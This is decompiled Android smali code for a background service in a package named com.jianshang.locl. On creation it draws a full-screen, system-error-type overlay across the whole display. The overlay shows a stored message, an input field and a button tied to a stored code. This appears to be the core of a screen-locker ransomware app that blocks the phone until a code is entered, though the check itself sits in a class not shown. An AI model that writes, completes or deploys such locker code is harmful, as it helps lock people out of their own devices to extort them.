.class public Lcom/jianshang/locl/b;
.super Landroid/app/Service;
.source "b.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/jianshang/locl/b$100000000;
    }
.end annotation


# instance fields
.field a:Landroid/widget/TextView;

.field b:Landroid/widget/EditText;

.field c:Landroid/widget/Button;

.field public mFloatLayout:Landroid/view/View;

.field public mWindowManager:Landroid/view/WindowManager;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 66
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 23
    const/4 v0, 0x0

    check-cast v0, Landroid/os/IBinder;

    return-object v0
.end method

.method public onCreate()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    const/4 v2, -0x1

    const-string v0, "com.aide.ui"

    invoke-static {p0, v0}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 29
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 30
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 31
    invoke-virtual {p0}, Lcom/jianshang/locl/b;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-virtual {p0}, Lcom/jianshang/locl/b;->getApplication()Landroid/app/Application;

    sget-object v1, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/jianshang/locl/b;->mWindowManager:Landroid/view/WindowManager;

    .line 32
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x7da

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 33
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v1, 0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 34
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x500

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 35
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v1, 0x11

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 36
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v2, v0, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 37
    iget-object v0, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    iput v2, v0, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 38
    invoke-virtual {p0}, Lcom/jianshang/locl/b;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-static {v0}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v1

    .line 39
    const/high16 v2, 0x7f030000

    const/4 v0, 0x0

    check-cast v0, Landroid/view/ViewGroup;

    invoke-virtual {v1, v2, v0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/jianshang/locl/b;->mFloatLayout:Landroid/view/View;

    .line 40
    iget-object v0, p0, Lcom/jianshang/locl/b;->mWindowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/jianshang/locl/b;->mFloatLayout:Landroid/view/View;

    iget-object v2, p0, Lcom/jianshang/locl/b;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 41
    iget-object v0, p0, Lcom/jianshang/locl/b;->mFloatLayout:Landroid/view/View;

    const/high16 v1, 0x7f060000

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/jianshang/locl/b;->a:Landroid/widget/TextView;

    .line 42
    iget-object v0, p0, Lcom/jianshang/locl/b;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f060001

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/jianshang/locl/b;->b:Landroid/widget/EditText;

    .line 43
    iget-object v0, p0, Lcom/jianshang/locl/b;->mFloatLayout:Landroid/view/View;

    const v1, 0x7f060002

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/jianshang/locl/b;->c:Landroid/widget/Button;

    .line 44
    const-string v0, "data"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/jianshang/locl/b;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 45
    const-string v1, "a"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 46
    const-string v2, "b"

    const-string v3, ""

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 47
    iget-object v2, p0, Lcom/jianshang/locl/b;->a:Landroid/widget/TextView;

    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 48
    iget-object v1, p0, Lcom/jianshang/locl/b;->c:Landroid/widget/Button;

    new-instance v2, Lcom/jianshang/locl/b$100000000;

    invoke-direct {v2, p0, v0}, Lcom/jianshang/locl/b$100000000;-><init>(Lcom/jianshang/locl/b;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method
